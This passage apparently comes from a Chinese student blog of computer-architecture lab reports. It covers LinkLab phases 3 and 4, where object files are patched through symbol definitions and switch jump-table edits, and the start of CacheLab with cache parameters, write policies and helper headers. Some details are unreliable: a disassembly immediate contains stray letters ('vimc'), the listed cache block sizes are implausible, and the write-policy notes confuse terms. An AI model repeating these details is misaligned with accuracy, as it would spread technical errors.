src="/2021/computer-architecture-hitlabs/image-20210525204701370.png" alt="image-20210525204701370"></p><p>下一条指令的地址为0x5c，故得call后面的偏移量为0x0-0x5c = -0x5c = ffffffa4，将它填入phase2.o的call后面：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210525212256082.png" alt="image-20210525212256082"></p><p>成功：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210525212737634.png" alt="image-20210525212737634"></p><blockquote><p>错误：operand type mismatch for ‘push’</p><p>原因：没有加上<code>-m32 -c</code>参数，在64-bit mode下面，push和栈进行交互的时候，不能使用%eax，而要使用%rax。</p></blockquote><h2 id="phase3"><a href="#phase3" class="headerlink" title="phase3"></a>phase3</h2><p>phase3的汇编代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;do_phase&gt;:</span><br><span class="line">   0:    f3 0f 1e fb              endbr32 </span><br><span class="line">   4:    55                       push   %ebp</span><br><span class="line">   5:    89 e5                    mov    %esp,%ebp</span><br><span class="line">   7:    83 ec 28                 sub    $0x28,%esp</span><br><span class="line">   a:    65 a1 14 00 00 00        mov    %gs:0x14,%eax</span><br><span class="line">  10:    89 45 f4                 mov    %eax,-0xc(%ebp)</span><br><span class="line">  13:    31 c0                    xor    %eax,%eax</span><br><span class="line">  15:    c7 45 e9 69 76 74 67     movl   $0x67747669,-0x17(%ebp)</span><br><span class="line">  1c:    c7 45 ed 6c 79 63 62     movl   $0x6263796vimc,-0x13(%ebp)</span><br><span class="line">  23:    66 c7 45 f1 61 7a        movw   $0x7a61,-0xf(%ebp)</span><br><span class="line">  29:    c6 45 f3 00              movb   $0x0,-0xd(%ebp)</span><br><span class="line">  2d:    c7 45 e4 00 00 00 00     movl   $0x0,-0x1c(%ebp)</span><br><span class="line">  34:    eb 28                    jmp    5e &lt;do_phase+0x5e&gt;</span><br><span class="line">  36:    8d 55 e9                 lea    -0x17(%ebp),%edx</span><br><span class="line">  39:    8b 45 e4                 mov    -0x1c(%ebp),%eax</span><br><span class="line">  3c:    01 d0                    add    %edx,%eax</span><br><span class="line">  3e:    0f b6 00                 movzbl (%eax),%eax</span><br><span class="line">  41:    0f b6 c0                 movzbl %al,%eax</span><br><span class="line">  44:    0f b6 80 00 00 00 00     movzbl 0x0(%eax),%eax</span><br><span class="line">truetruetrue47: R_386_32    orEYJGWrtE</span><br><span class="line">  4b:    0f be c0                 movsbl %al,%eax</span><br><span class="line">  4e:    83 ec 0c                 sub    $0xc,%esp</span><br><span class="line">  51:    50                       push   %eax</span><br><span class="line">  52:    e8 fc ff ff ff           call   53 &lt;do_phase+0x53&gt;</span><br><span class="line">truetruetrue53: R_386_PC32    putchar</span><br><span class="line">  57:    83 c4 10                 add    $0x10,%esp</span><br><span class="line">  5a:    83 45 e4 01              addl   $0x1,-0x1c(%ebp)</span><br><span class="line">  5e:    8b 45 e4                 mov    -0x1c(%ebp),%eax</span><br><span class="line">  61:    83 f8 09                 cmp    $0x9,%eax</span><br><span class="line">  64:    76 d0                    jbe    36 &lt;do_phase+0x36&gt;</span><br><span class="line">  66:    83 ec 0c                 sub    $0xc,%esp</span><br><span class="line">  69:    6a 0a                    push   $0xa</span><br><span class="line">  6b:    e8 fc ff ff ff           call   6c &lt;do_phase+0x6c&gt;</span><br><span class="line">truetruetrue6c: R_386_PC32    putchar</span><br><span class="line">  70:    83 c4 10                 add    $0x10,%esp</span><br><span class="line">  73:    90                       nop</span><br><span class="line">  74:    8b 45 f4                 mov    -0xc(%ebp),%eax</span><br><span class="line">  77:    65 33 05 14 00 00 00     xor    %gs:0x14,%eax</span><br><span class="line">  7e:    74 05                    je     85 &lt;do_phase+0x85&gt;</span><br><span class="line">  80:    e8 fc ff ff ff           call   81 &lt;do_phase+0x81&gt;</span><br><span class="line">truetruetrue81: R_386_PC32    __stack_chk_fail</span><br><span class="line">  85:    c9                       leave  </span><br><span class="line">  86:    c3                       ret </span><br></pre></td></tr></table></figure><p>可得大概框架为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> orEYJGWrtE[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_phase</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> cookie[] = PHASE3_COOKIE;</span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(cookie)<span class="number">-1</span>; i++ )</span><br><span class="line">                <span class="built_in">printf</span>( <span class="string">&quot;%c&quot;</span>, orEYJGWrtE[ (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(cookie[i]) ] );</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;\n&quot;</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模块入口函数do_phase()依次遍历一个COOKIE字符串（由一组互不相同的英文字母组成，且总长度与学号字符串相同）中的每一字符，并通过一个映射数组将该字符的不同可能ASCII编码取值映射为输出字符。  </p><p>分析汇编代码中的mov指令可知压入的字符数组内容为ivtglycbaz，对应的unsigned char为69 76 74 67 6c 79 63 62 61 7a（十六进制）:</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526145900036.png" alt="image-20210526145900036"></p><p>在phase3_patch.c文件中添加orEYJGWrtE字符数组的强定义代替phase3中的弱定义，按照对应的位置填入学号，如orEYJGWrtE[0x69 = 105] = ‘1’:</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526154957125.png" alt="image-20210526154957125"></p><p> 成功：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526160458435.png" alt="image-20210526160458435"></p><h2 id="phase4"><a href="#phase4" class="headerlink" title="phase4"></a>phase4</h2><p>phase4代码框架为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_phase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> cookie[] = PHASE4_COOKIE;</span><br><span class="line">        <span class="keyword">char</span> c;</span><br><span class="line">        <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(cookie)<span class="number">-1</span>; i++ ) </span><br><span class="line">       &#123;</span><br><span class="line">                c = cookie[i];</span><br><span class="line">                <span class="keyword">switch</span> (c) </span><br><span class="line">                &#123;</span><br><span class="line">                      <span class="comment">// 映射关系</span></span><br><span class="line">                      <span class="keyword">case</span> ‘A’: &#123; c = <span class="number">48</span>; <span class="keyword">break</span>; &#125; </span><br><span class="line">                      <span class="keyword">case</span> ‘B’: &#123; c = <span class="number">121</span>; <span class="keyword">break</span>; &#125;</span><br><span class="line">                        …</span><br><span class="line">                      <span class="keyword">case</span> ‘Z’: &#123; c = <span class="number">93</span>; <span class="keyword">break</span>; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模块入口函数do_phase()依次遍历一个COOKIE字符串（由一组互不相同的大写英文字母组成，且总长度与学号字符串相同）中的每一字符，并使用一个switch语句将该字符的不同可能ASCII编码取值映射为输出字符。  </p><p>与phase3类似，得到顺序字符数组为YJAFXRBDQW。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526164951173.png" alt="image-20210526164951173"></p><p>汇编代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;do_phase&gt;:</span><br><span class="line">   0:    f3 0f 1e fb              endbr32 </span><br><span class="line">   4:    55                       push   %ebp</span><br><span class="line">   5:    89 e5                    mov    %esp,%ebp</span><br><span class="line">   7:    83 ec 28                 sub    $0x28,%esp</span><br><span class="line">   a:    65 a1 14 00 00 00        mov    %gs:0x14,%eax</span><br><span class="line">  10:    89 45 f4                 mov    %eax,-0xc(%ebp)</span><br><span class="line">  13:    31 c0                    xor    %eax,%eax</span><br><span class="line">  15:    c7 45 e9 59 4a 41 46     movl   $0x46414a59,-0x17(%ebp)</span><br><span class="line">  1c:    c7 45 ed 58 52 42 44     movl   $0x44425258,-0x13(%ebp)</span><br><span class="line">  23:    66 c7 45 f1 51 57        movw   $0x5751,-0xf(%ebp)</span><br><span class="line">  29:    c6 45 f3 00              movb   $0x0,-0xd(%ebp)</span><br><span class="line">  2d:    c7 45 e4 00 00 00 00     movl   $0x0,-0x1c(%ebp)</span><br><span class="line">  34:    e9 e3 00 00 00           jmp    11c &lt;do_phase+0x11c&gt;</span><br><span class="line">  39:    8d 55 e9                 lea    -0x17(%ebp),%edx   # cookie字符串地址</span><br><span class="line">  3c:    8b 45 e4                 mov    -0x1c(%ebp),%eax</span><br><span class="line">  3f:    01 d0                    add    %edx,%eax</span><br><span class="line">  41:    0f b6 00                 movzbl (%eax),%eax</span><br><span class="line">  44:    88 45 e3                 mov    %al,-0x1d(%ebp)  </span><br><span class="line">  47:    0f be 45 e3              movsbl -0x1d(%ebp),%eax   # 顺序取字符</span><br><span class="line">  4b:    83 e8 41                 sub    $0x41,%eax    # 对应的ASCII减去0x41</span><br><span class="line">  4e:    83 f8 19                 cmp    $0x19,%eax    # 与0x19比较</span><br><span class="line">  51:    0f 87 b1 00 00 00        ja     108 &lt;do_phase+0x108&gt;   # 若大于0x19则跳转（非大写字母）</span><br><span class="line">  57:    8b 04 85 00 00 00 00     mov    0x0(,%eax,4),%eax   # (cookie[i]-0x41)*4</span><br><span class="line">truetruetrue5a: R_386_32    .rodata</span><br><span class="line">  5e:    3e ff e0                 notrack jmp *%eax</span><br><span class="line">  61:    c6 45 e3 6a              movb   $0x6a,-0x1d(%ebp)</span><br><span class="line">  65:    e9 9e 00 00 00           jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  6a:    c6 45 e3 39              movb   $0x39,-0x1d(%ebp)</span><br><span class="line">  6e:    e9 95 00 00 00           jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  73:    c6 45 e3 36              movb   $0x36,-0x1d(%ebp)</span><br><span class="line">  77:    e9 8c 00 00 00           jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  7c:    c6 45 e3 31              movb   $0x31,-0x1d(%ebp)</span><br><span class="line">  80:    e9 83 00 00 00           jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  85:    c6 45 e3 69              movb   $0x69,-0x1d(%ebp)</span><br><span class="line">  89:    eb 7d                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  8b:    c6 45 e3 66              movb   $0x66,-0x1d(%ebp)</span><br><span class="line">  8f:    eb 77                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  91:    c6 45 e3 37              movb   $0x37,-0x1d(%ebp)</span><br><span class="line">  95:    eb 71                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  97:    c6 45 e3 32              movb   $0x32,-0x1d(%ebp)</span><br><span class="line">  9b:    eb 6b                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  9d:    c6 45 e3 30              movb   $0x30,-0x1d(%ebp)</span><br><span class="line">  a1:    eb 65                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  a3:    c6 45 e3 7c              movb   $0x7c,-0x1d(%ebp)</span><br><span class="line">  a7:    eb 5f                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  a9:    c6 45 e3 5a              movb   $0x5a,-0x1d(%ebp)</span><br><span class="line">  ad:    eb 59                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  af:    c6 45 e3 5e              movb   $0x5e,-0x1d(%ebp)</span><br><span class="line">  b3:    eb 53                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  b5:    c6 45 e3 44              movb   $0x44,-0x1d(%ebp)</span><br><span class="line">  b9:    eb 4d                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  bb:    c6 45 e3 3a              movb   $0x3a,-0x1d(%ebp)</span><br><span class="line">  bf:    eb 47                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  c1:    c6 45 e3 34              movb   $0x34,-0x1d(%ebp)</span><br><span class="line">  c5:    eb 41                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  c7:    c6 45 e3 5c              movb   $0x5c,-0x1d(%ebp)</span><br><span class="line">  cb:    eb 3b                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  cd:    c6 45 e3 47              movb   $0x47,-0x1d(%ebp)</span><br><span class="line">  d1:    eb 35                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  d3:    c6 45 e3 5b              movb   $0x5b,-0x1d(%ebp)</span><br><span class="line">  d7:    eb 2f                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  d9:    c6 45 e3 58              movb   $0x58,-0x1d(%ebp)</span><br><span class="line">  dd:    eb 29                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  df:    c6 45 e3 4b              movb   $0x4b,-0x1d(%ebp)</span><br><span class="line">  e3:    eb 23                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  e5:    c6 45 e3 66              movb   $0x66,-0x1d(%ebp)</span><br><span class="line">  e9:    eb 1d                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  eb:    c6 45 e3 5a              movb   $0x5a,-0x1d(%ebp)</span><br><span class="line">  ef:    eb 17                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  f1:    c6 45 e3 38              movb   $0x38,-0x1d(%ebp)</span><br><span class="line">  f5:    eb 11                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  f7:    c6 45 e3 49              movb   $0x49,-0x1d(%ebp)</span><br><span class="line">  fb:    eb 0b                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  fd:    c6 45 e3 33              movb   $0x33,-0x1d(%ebp)</span><br><span class="line"> 101:    eb 05                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line"> 103:    c6 45 e3 35              movb   $0x35,-0x1d(%ebp)</span><br><span class="line"> 107:    90                       nop</span><br><span class="line"> 108:    0f be 45 e3              movsbl -0x1d(%ebp),%eax</span><br><span class="line"> 10c:    83 ec 0c                 sub    $0xc,%esp</span><br><span class="line"> 10f:    50                       push   %eax</span><br><span class="line"> 110:    e8 fc ff ff ff           call   111 &lt;do_phase+0x111&gt;</span><br><span class="line">truetruetrue111: R_386_PC32    putchar</span><br><span class="line"> 115:    83 c4 10                 add    $0x10,%esp</span><br><span class="line"> 118:    83 45 e4 01              addl   $0x1,-0x1c(%ebp)</span><br><span class="line"> 11c:    8b 45 e4                 mov    -0x1c(%ebp),%eax</span><br><span class="line"> 11f:    83 f8 09                 cmp    $0x9,%eax</span><br><span class="line"> 122:    0f 86 11 ff ff ff        jbe    39 &lt;do_phase+0x39&gt;</span><br><span class="line"> 128:    83 ec 0c                 sub    $0xc,%esp</span><br><span class="line"> 12b:    6a 0a                    push   $0xa</span><br><span class="line"> 12d:    e8 fc ff ff ff           call   12e &lt;do_phase+0x12e&gt;</span><br><span class="line">truetruetrue12e: R_386_PC32    putchar</span><br><span class="line"> 132:    83 c4 10                 add    $0x10,%esp</span><br><span class="line"> 135:    90                       nop</span><br><span class="line"> 136:    8b 45 f4                 mov    -0xc(%ebp),%eax</span><br><span class="line"> 139:    65 33 05 14 00 00 00     xor    %gs:0x14,%eax</span><br><span class="line"> 140:    74 05                    je     147 &lt;do_phase+0x147&gt;</span><br><span class="line"> 142:    e8 fc ff ff ff           call   143 &lt;do_phase+0x143&gt;</span><br><span class="line">truetruetrue143: R_386_PC32    __stack_chk_fail</span><br><span class="line"> 147:    c9                       leave  </span><br><span class="line"> 148:    c3                       ret   </span><br></pre></td></tr></table></figure><p>由节头表信息可知.rodata在phase4.o的0x184处：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526190222214.png" alt="image-20210526190222214"></p><p>分析汇编代码可得映射关系，根据switch中对应输出的字符来修改switch跳转表信息：</p><p><img src="/2021/computer-architecture-hitlabs/Snipaste_2021-05-26_18-52-18.png" alt="Snipaste_2021-05-26_18-52-18"></p><p>以字符串第一个Y为例，对应的应该是学号中第一个字符’1’，故在.text中找到对应输出’1’的语句的地址填入switch跳转表对应的Y的位置（倒数第二个）：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526191508525.png" alt="image-20210526191508525"></p><p>原本的值与目标之间大了0x81，故将机器代码中的0xfd改为0xfd - 0x81 = 0x7c。则可以正确显示出第一个字符’1’。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526191833020.png" alt="image-20210526191833020"></p><p>其他的字符用相同的方法填入，成功：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526213213296.png" alt="image-20210526213213296"></p><h1 id="实验六-CacheLab"><a href="#实验六-CacheLab" class="headerlink" title="实验六 CacheLab"></a>实验六 CacheLab</h1><h3 id="用CPU-Z查看计算机Cache各参数"><a href="#用CPU-Z查看计算机Cache各参数" class="headerlink" title="用CPU-Z查看计算机Cache各参数"></a>用CPU-Z查看计算机Cache各参数</h3><p><img src="/2021/computer-architecture-hitlabs/image-20210528162204930.png" alt="image-20210528162204930"></p><p><img src="/2021/computer-architecture-hitlabs/image-20210528211434587.png" alt="image-20210528211434587"></p><p>一级缓存：C = 32KB; S = 512; E = 8; B = 8B; s = 9; e = 3; b = 3.</p><p>二级缓存：C = 256KB; S = 4096; E = 4; B = 16B; s = 12; e = 2; b = 4.</p><p>三级缓存：C = 8MB; S = 131072; E = 16; B = 4B; s = 17; e = 4; b = 2.</p><h3 id="Cache读写策略："><a href="#Cache读写策略：" class="headerlink" title="Cache读写策略："></a>Cache读写策略：</h3><p>read-through：</p><ul><li>从 cache 中读取数据，读取到就直接返回 。</li><li>读取不到的话，先从低一层加载，写入到 cache 后返回响应。</li></ul><p>Cache Aside Pattern（旁路缓存模式）：</p><p>在更新数据时不更新缓存，而是删除缓存中的数据，在读取数据时，发现缓存中没了数据之后，再从数据库中读取数据，更新到缓存中。</p><p>读：write-through</p><p>写：更新低一层后删除cache中的内容。</p><p>写命中：</p><ol><li>直写 write-through</li></ol><p>立即将w的高速缓存块写回到紧接着的低一层中。</p><ol start="2"><li>写回 write-back</li></ol><p>尽可能地推迟更新，只有当被替换时才写回，需要增加一个格外的dirty bit。</p><p>写不命中：</p><ol><li>写分配 write-allocate</li></ol><p>将要修改的块从低一层运到缓存中，在缓存中修改。</p><ol start="2"><li>非写分配 not-write-allocate</li></ol><p>避开缓存，直接把这个字写入到低一层中。</p><h3 id="使用-valgrind-和-gprof-进行程序性能分析的方法。"><a href="#使用-valgrind-和-gprof-进行程序性能分析的方法。" class="headerlink" title="使用 valgrind 和 gprof 进行程序性能分析的方法。"></a>使用 valgrind 和 gprof 进行程序性能分析的<a href>方法</a>。</h3><h2 id="csim-cache-simulation"><a href="#csim-cache-simulation" class="headerlink" title="csim (cache simulation)"></a>csim (cache simulation)</h2><p>csim-ref执行文件的使用方法：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526161059425.png" alt="image-20210526161059425"></p><p>示例：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526161147468.png" alt="image-20210526161147468"></p><p>cachelab.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * cachelab.h - Prototypes for Cache Lab helper functions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CACHELAB_TOOLS_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CACHELAB_TOOLS_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_TRANS_FUNCS 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">trans_func</span>&#123;</span></span><br><span class="line">  <span class="keyword">void</span> (*func_ptr)(<span class="keyword">int</span> M,<span class="keyword">int</span> N,<span class="keyword">int</span>[N][M],<span class="keyword">int</span>[M][N]);</span><br><span class="line">  <span class="keyword">char</span>* description;</span><br><span class="line">  <span class="keyword">char</span> correct;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_hits;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_misses;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_evictions;</span><br><span class="line">&#125; <span class="keyword">trans_func_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * printSummary - This function provides a standard way for your cache</span></span><br><span class="line"><span class="comment"> * simulator * to display its final hit and miss statistics</span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printSummary</span><span class="params">(<span class="keyword">int</span> hits,  <span class="comment">/* number of  hits */</span></span></span></span><br><span class="line"><span class="function"><span class="params">                  <span class="keyword">int</span> misses, <span class="comment">/* number of misses */</span></span></span></span><br><span class="line"><span class="function"><span class="params">                  <span class="keyword">int</span> evictions)</span></span>; <span class="comment">/* number of evictions */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Fill the matrix with data */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initMatrix</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The baseline trans function that produces correct results. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">correctTrans</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Add the given function to the function list */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerTransFunction</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">void</span> (*trans)(<span class="keyword">int</span> M,<span class="keyword">int</span> N,<span class="keyword">int</span>[N][M],<span class="keyword">int</span>[M][N]), <span class="keyword">char</span>* desc)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CACHELAB_TOOLS_H */</span></span></span><br></pre></td></tr></table></figure><p>cachelab.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * cachelab.c - Cache Lab helper functions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 